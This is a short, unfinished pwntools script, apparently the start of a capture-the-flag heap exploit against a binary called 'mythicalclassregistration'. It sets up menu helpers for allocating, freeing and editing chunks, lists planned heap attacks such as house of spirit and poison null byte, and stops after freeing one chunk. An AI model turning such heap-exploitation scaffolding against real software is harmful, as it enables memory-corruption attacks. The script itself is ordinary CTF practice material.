#!/usr/bin/python3
from pwn import *
import math


# these attacks /should/ be possible:
# house of spirit
# poison_null_byte
# large bin attack

context.terminal = ['termite', '-e']
context.binary = binary = ELF('mythicalclassregistration')

p = process(binary.path)

gdb.attach(p, "c")


def alloc(payload):
    p.sendlineafter(b' > ', b'1')
    p.sendlineafter(b' > ', payload)


def free(index):
    p.sendlineafter(b' > ', b'3')
    p.sendlineafter(b' > ', b'%d' % index)


def edit(index, payload):
    p.sendlineafter(b' > ', b'2')
    p.sendlineafter(b' > ', b'%d' % index)
    p.sendlineafter(b' > ', payload)


def calculate_real_chunksize(input_size):
    return (math.ceil(input_size / 16) + 1)*16



alloc(b'A'*1600)
alloc(b'B'*1600)
alloc(b'C'*1600)
alloc(b'D'*1600)
alloc(b'E'*1600)


# free D
free(3)



